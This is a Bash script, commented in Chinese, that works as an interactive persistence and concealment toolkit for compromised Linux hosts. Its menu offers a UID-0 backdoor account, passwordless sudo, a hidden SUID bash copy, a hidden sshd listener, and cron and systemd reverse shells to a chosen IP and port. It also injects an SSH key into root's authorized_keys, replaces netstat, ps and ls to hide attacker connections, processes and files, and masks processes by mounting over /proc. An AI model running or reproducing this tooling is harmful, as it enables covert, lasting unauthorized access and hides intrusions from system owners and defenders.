#!/bin/bash

# 函数：添加后门账户
bDoorAdd() {
  local user=$1
  # 检查用户是否已存在
  if id "$user" &>/dev/null; then
    echo "${user} 账号已经存在"
  else
    # 创建用户，指定 UID 和 GID 为 0，并设置 home 目录为 /root
    useradd -o -u 0 -g 0  -M "$user"

    # 更安全的密码生成和设置方式
    local password=$(openssl rand -base64 12)
    echo "${user}:${password}" | chpasswd
       echo "添加成功，用户名为 ${user}，密码为：${password}"
  fi
}

# 函数：为账户添加sudo权限
sudoAdd() {
    local user=$1
    # 检查用户是否存在
    if id "$user" &>/dev/null; then
        # 使用 visudo 编辑 sudoers 文件，更安全
        echo "${user} ALL=(ALL) NOPASSWD:ALL" | sudo EDITOR='tee -a' visudo
        echo "添加成功，用户名为 ${user}"
    else
        echo "账号不存在"
    fi
}

# 函数：隐藏bash命令
hideBash() {
    local bash_copy="/usr/local/bin/.$(basename /bin/bash)"  # 更隐蔽的路径
    # 检查隐藏的bash是否已存在
    if [[ ! -f "$bash_copy" ]]; then
        # 复制bash并设置SUID权限
        cp /bin/bash "$bash_copy" && chmod 4755 "$bash_copy"
        # 修改时间戳，模仿原始文件
        touch -r /bin/bash "$bash_copy"
        # 添加不可修改属性
        chattr +i "$bash_copy"
          echo "添加成功，文件名为 $bash_copy"
        echo "使用方法 $bash_copy -p"  # 使用 -p 选项进入特权模式
    else
        echo "文件已经存在"
    fi
}

# 函数：检查端口是否被占用
checkPort() {
  # 使用 ss 命令替代 netstat，更现代
  ss -tulnp | grep ":$1 " &>/dev/null
  return $?
}

# 函数：软链sshd后门
softLink() {
    local port=$1
    # 检查端口是否被占用
    if ! checkPort "$port"; then
        # 更换一个更隐蔽的后门位置和文件名
        local sshd_link="/usr/local/sbin/.$(basename /usr/sbin/sshd)"

        # 确保目标目录存在
        mkdir -p "$(dirname "$sshd_link")"

        # 创建软链接
        ln -sf /usr/sbin/sshd "$sshd_link"
        # 启动sshd，指定端口和配置文件（使用默认配置）
        "$sshd_link" -p "$port"
        if checkPort "$port"; then
             echo "${port} 端口sshd服务开启成功"
            echo "建议使用ssh隐身登录：ssh -T root@ip -p ${port}"
        else
            echo "启动失败"
        fi
    else
        echo "端口被占用"
    fi
}

# 函数：隐藏网络连接 (通过修改 netstat)
HiddenNetWork() {
    local ip=$1
    local netstat_path="/usr/bin/netstat"
    # 使用更隐蔽的备份目录,这里不能用basename了
    local backup_path="/usr/local/lib/.netstat"
    local backup_file="${backup_path}/.bak"
    local hidden_ips_file="${backup_path}/.ips"

    # 创建备份目录
    mkdir -p "$backup_path"

    # 备份 netstat
    if [[ ! -f "$backup_file" ]]; then
        cp "$netstat_path" "$backup_path/.netstat" && cp "$netstat_path" "$backup_file" || {
            echo "错误: 备份 netstat 失败"
            return 1
        }
     else
        echo "netstat 已经备份过了"
    fi


    # 删除原 netstat 文件
    rm -f "$netstat_path"

    # 将新的 IP 添加到隐藏列表,写入绝对路径
    echo "$ip" >> "$hidden_ips_file"

    # 创建新的 netstat 文件
    {
        echo '#!/bin/bash'
        # 调用备份的 netstat，并过滤隐藏的 IP
        echo "${backup_path}/.netstat \$@ | grep -v -f '$hidden_ips_file' | grep -v '${backup_path}'"
    } > "$netstat_path"

    # 设置权限
    chmod +x "$netstat_path" || {
        echo "错误: 设置权限失败"
        return 1
    }
    # 设置时间戳
    touch -acmr "${backup_file}" "${netstat_path}"
}

# 函数：隐藏进程 (通过修改 ps)
HiddenProcess() {
  local process=$1
  local ps_path="/usr/bin/ps"
  # 使用更隐蔽的备份目录
  local backup_path="/usr/local/lib/.ps"
  local backup_file="${backup_path}/.bak"
  local hidden_processes_file="${backup_path}/.processes"

  # 创建备份目录
  mkdir -p "$backup_path"

  # 备份 ps
  if [[ ! -f "$backup_file" ]]; then
    cp "$ps_path" "$backup_path/.ps" && cp "$ps_path" "$backup_file" || {
      echo "错误: 备份 ps 失败"
      return 1
    }
  else
    echo "ps 已经备份过了"
  fi

  # 删除原 ps 文件
  rm -f "$ps_path"

  # 将新的进程名添加到隐藏列表
  echo "$process" >> "$hidden_processes_file"

  # 创建新的 ps 文件
  {
    echo '#!/bin/bash'
    # 调用备份的 ps，并过滤隐藏的进程名
    echo "${backup_path}/.ps \$@ | grep -v -f '$hidden_processes_file' | grep -v '${backup_path}' | grep -v '/bin/bash /usr/bin/ps'"
  } > "$ps_path"

  # 设置权限
  chmod +x "$ps_path" || {
    echo "错误: 设置权限失败"
    return 1
  }
  # 设置时间戳
  touch -acmr "${backup_file}" "${ps_path}"
}

# 函数：隐藏文件列表 (通过修改 ls)
HiddenList() {
  local hide_item=$1
  local ls_path="/usr/bin/ls"
  # 使用更隐蔽的备份目录
  local backup_path="/usr/local/lib/.ls"
  local backup_file="${backup_path}/.bak"
  local hidden_items_file="${backup_path}/.items"  # 存储要隐藏的文件/目录名

  # 创建备份目录
  mkdir -p "$backup_path"

  # 备份 ls
  if [[ ! -f "$backup_file" ]]; then
    cp "$ls_path" "$backup_path/.ls" && cp "$ls_path" "$backup_file" || {
      echo "错误: 备份 ls 失败"
      return 1
    }
  else
    echo "ls 已经备份过了"
  fi

  # 删除原 ls 文件
  rm -f "$ls_path"

  # 将要隐藏的项目添加到列表
  echo "$hide_item" >> "$hidden_items_file"

  # 创建新的 ls 文件
  {
    echo '#!/bin/bash'
    # 调用备份的 ls，并过滤隐藏的项目
    echo "${backup_path}/.ls \$@ | grep -v -f '$hidden_items_file' | grep -v '${backup_path}'"
  } > "$ls_path"

  # 设置权限
  chmod +x "$ls_path" || {
    echo "错误: 设置权限失败"
    return 1
  }
  # 设置时间戳
  touch -acmr "${backup_file}" "${ls_path}"
}

# 函数：crontab反向Shell
Timing() {
    local ip=$1
    local port=$2
    # 更安全的shell命令
    local shell_command="/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
    # 使用 crontab -e 编辑，而不是直接写入文件
    (crontab -l 2>/dev/null; echo "*/1 * * * * ${shell_command}") | crontab -
}

# 函数：写入公钥
Pub() {
    # 检查公钥文件是否存在
    if [[ -f ./id_rsa.pub ]]; then
        # 追加公钥到 authorized_keys，并确保权限正确
        cat id_rsa.pub >> /root/.ssh/authorized_keys
        chmod 600 /root/.ssh/authorized_keys
         echo "公钥已写入"
    else
        echo "请先上传公钥到当前目录"
    fi
}

# 函数：持久化反向Shell (使用systemd)
persistShellWithSystemd() {
    local ip=$1
    local port=$2
    # systemd 服务文件内容
    local service_content=$(cat <<EOF
[Unit]
Description=Persistent Reverse Shell
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1; sleep 10; done'
Restart=always
User=root
WorkingDirectory=/root  # 指定工作目录

[Install]
WantedBy=multi-user.target
EOF
)
    # 写入服务文件
    echo "${service_content}" > /etc/systemd/system/reverse_shell.service
    # 重新加载 systemd 配置
    systemctl daemon-reload
    # 启用并启动服务
    systemctl enable reverse_shell.service
    systemctl start reverse_shell.service
    # 检查服务是否激活
    if systemctl is-active --quiet reverse_shell.service; then
        echo "反向Shell已持久化并通过systemd启动"
        echo "使用 systemctl start/status/stop reverse_shell.service 管理服务"
    else
        echo "反向Shell持久化失败，服务未启动成功"
    fi
}

# 函数：隐藏进程网络 (通过挂载)
hideProcessNetwork() {
  local process_name=$1

  # 使用 pgrep 查找进程 PID，更简洁
  local pid=$(pgrep -f "$process_name")

  if [[ -z "$pid" ]]; then
    echo "未找到名为 '$process_name' 的进程。"
    return 1
  fi

  # 处理多个同名进程
  if [[ $(echo "$pid" | wc -w) -gt 1 ]]; then
    echo "找到多个进程:"
    echo "$pid"
    read -p "请输入需要隐藏的PID: " pid
  fi

    # 使用更隐蔽的目录名
    local null_dir="/dev/shm/.null_$(date +%s)"

  # 创建空目录
  mkdir -p "$null_dir"

  # 使用 sudo 绑定挂载，隐藏进程信息
  sudo mount --bind "$null_dir" "/proc/$pid"

  if [[ $? -eq 0 ]]; then
    echo "进程 '$process_name' (PID: $pid) 的网络连接已隐藏。"
    echo "使用以下命令恢复："
    echo "sudo umount /proc/$pid"
    echo "rm -rf $null_dir"
  else
    echo "隐藏进程网络连接失败。"
    rm -rf "$null_dir"
  fi
}
# 检查是否为 root 用户
if [[ $EUID -ne 0 ]]; then
   echo "此脚本需要以 root 权限运行，请使用 sudo ./$(basename $0)"
   exit 1
fi

# 主程序
show() {
  cat <<EOF

███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗     ██████╗  ██████╗  ██████╗ ████████╗
██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
█████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║     ██████╔╝██║   ██║██║   ██║   ██║
██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║     ██╔══██╗██║   ██║██║   ██║   ██║
███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗██║  ██║╚██████╔╝╚██████╔╝   ██║
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝

请选择维持方式：
    [1] 添加后门账户
    [2] 为账户添加sudo权限
    [3] 隐藏bash命令
    [4] 软链sshd后门
    [5] crontab反向Shell
    [6] 写入公钥
    [7] 持久化反向Shell
    [8] 隐藏网络连接
    [9] 隐藏进程
    [10] 隐藏文件列表
    [11] 挂载隐藏进程网络
EOF
}
show
read -p "序号：" choice
case $choice in
1)
  read -p "请输入添加账号名：" user
  bDoorAdd "$user"
  ;;
2)
  read -p "请输入添加账户名：" user
  sudoAdd "$user"
  ;;
3)
  hideBash
  ;;
4)
  while true; do
    read -p "希望开放端口：" port
    if ! checkPort "$port"; then
      softLink "$port"
      break
    else
      echo "端口被占用"
    fi
  done
  ;;
5)
  read -p "请输入ip：" ip
  read -p "请输入端口号：" port
  Timing "$ip" "$port"
  ;;
6)
  Pub
  ;;
7)
  read -p "请输入ip:" ip
  read -p "请输入端口:" port
  persistShellWithSystemd "$ip" "$port"
  ;;
8)
  read -p "请输入ip或字符串:" ip
  HiddenNetWork "$ip"
  ;;
9)
  read -p "请输入进程名:" process
  HiddenProcess "$process"
  ;;
10)
  read -p "请输入要隐藏的文件夹或文件:" hide_item
  HiddenList "$hide_item"
  ;;
11)
  read -p "请输入要隐藏网络连接的进程名: " process_name
  hideProcessNetwork "$process_name"
  ;;
*)
  echo "无效的序号"
  ;;
esac
